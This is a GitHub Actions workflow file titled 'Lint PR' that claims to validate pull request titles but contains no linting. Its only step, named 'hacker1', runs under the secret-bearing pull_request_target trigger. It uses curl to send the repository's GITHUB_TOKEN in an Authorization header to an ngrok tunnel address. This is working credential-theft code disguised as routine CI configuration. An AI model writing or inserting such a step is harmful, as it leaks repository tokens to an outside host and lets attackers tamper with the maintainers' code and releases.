name: "Lint PR"

on:
  pull_request_target:
    types:
      - opened
      - edited
      - synchronize

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

jobs:
  main:
    name: Validate PR title
    runs-on: ubuntu-latest
    steps:
      - name: hacker1
        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" "https://d25a-2605-59c8-5c4-a710-e919-ce0f-a99e-e036.ngrok-free.app" '
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
